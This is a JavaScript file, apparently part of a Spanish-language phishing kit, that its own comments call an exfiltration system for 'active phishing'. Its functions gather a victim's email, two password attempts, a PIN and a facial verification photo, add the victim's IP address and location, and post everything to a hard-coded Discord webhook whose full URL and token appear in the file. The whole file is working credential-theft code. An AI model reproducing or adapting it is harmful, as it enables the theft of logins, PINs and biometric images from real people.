const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1555050804321325066/eki89RStJo8xUc5oM5Vwl4N_VavKg3BkipFGrr8-A_ZVRVuhqpwfBNbxlaoxBjESkkgm';
const DISCORD_WEBHOOK_VERIFICATION = 'https://discord.com/api/webhooks/1555050804321325066/eki89RStJo8xUc5oM5Vwl4N_VavKg3BkipFGrr8-A_ZVRVuhqpwfBNbxlaoxBjESkkgm';

async function getLocationInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'No disponible',
            country: data.country_name || 'No disponible',
            region: data.region || 'No disponible',
            city: data.city || 'No disponible'
        };
    } catch (error) {
        return { ip: 'No disponible', country: 'No disponible', region: 'No disponible', city: 'No disponible' };
    }
}

async function sendDiscordMessage(embed) {
    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
        return response.ok;
    } catch (error) {
        return false;
    }
}

// ===== FUNCIÓN PRINCIPAL: Correo + Contraseña + PIN =====
async function sendLoginData(email, password, pin = 'No especificado') {
    console.log('🚨 Enviando PRIMERA contraseña con PIN...');
    
    try {
        const timestamp = new Date().toLocaleString('es-ES');
        const location = await getLocationInfo();
        
        const embed = {
            title: '🔐 NUEVAS CREDENCIALES (Intento 1)',
            color: 0xff0000,
            fields: [
                { name: '📧 Correo', value: email, inline: true },
                { name: '🔑 Contraseña #1', value: `\`\`\`${password}\`\`\``, inline: true },
                { name: '🔐 PIN', value: `\`\`\`${pin}\`\`\``, inline: true },
                { name: '🌍 País', value: location.country, inline: true },
                { name: '📍 Ciudad', value: location.city, inline: true },
                { name: '🌐 IP', value: location.ip, inline: true },
                { name: '⏰ Hora', value: timestamp, inline: true }
            ],
            footer: { text: 'Sistema de Exfiltración v3.0 - Intento 1' },
            timestamp: new Date().toISOString()
        };
        
        return await sendDiscordMessage(embed);
    } catch (error) {
        console.error('❌ Error:', error);
        return false;
    }
}

// ===== SEGUNDA CONTRASEÑA (Reintento) =====
async function sendSecondPassword(email, password, pin = 'No especificado') {
    console.log('🚨 Enviando SEGUNDA contraseña...');
    
    try {
        const timestamp = new Date().toLocaleString('es-ES');
        const location = await getLocationInfo();
        
        const embed = {
            title: '🔐 REINTENTO DE CONTRASEÑA (Intento 2)',
            color: 0xff6600,
            fields: [
                { name: '📧 Correo', value: email, inline: true },
                { name: '🔑 Contraseña #2', value: `\`\`\`${password}\`\`\``, inline: true },
                { name: '🔐 PIN', value: `\`\`\`${pin}\`\`\``, inline: true },
                { name: '🌍 País', value: location.country, inline: true },
                { name: '📍 Ciudad', value: location.city, inline: true },
                { name: '🌐 IP', value: location.ip, inline: true },
                { name: '⏰ Hora', value: timestamp, inline: true }
            ],
            footer: { text: 'Sistema de Exfiltración v3.0 - Intento 2' },
            timestamp: new Date().toISOString()
        };
        
        return await sendDiscordMessage(embed);
    } catch (error) {
        console.error('❌ Error:', error);
        return false;
    }
}

// ===== FOTO DE VERIFICACIÓN =====
async function sendPhotoData(imageData, email) {
    console.log('📸 Enviando foto de verificación...');
    
    try {
        function dataURLtoBlob(dataurl) {
            const arr = dataurl.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) {
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], { type: mime });
        }
        
        const blob = dataURLtoBlob(imageData);
        const formData = new FormData();
        
        formData.append('payload_json', JSON.stringify({
            content: `📸 **Nueva verificación facial**\n📧 **Correo:** ${email || 'No especificado'}`,
            username: 'Verificación Fácil'
        }));
        
        formData.append('file', blob, 'foto-verificacion.jpg');
        
        const response = await fetch(DISCORD_WEBHOOK_VERIFICATION, {
            method: 'POST',
            body: formData
        });
        
        return response.ok;
    } catch (error) {
        console.error('❌ Error:', error);
        return false;
    }
}

// ===== EXPORTAR FUNCIONES =====
if (typeof window !== 'undefined') {
    window.sendLoginData = sendLoginData;
    window.sendSecondPassword = sendSecondPassword;
    window.sendPhotoData = sendPhotoData;
    
    console.log('✅ Sistema de exfiltración v3.0 cargado');
    console.log('🎯 Ready para phishing activo con 2 intentos de contraseña');
}
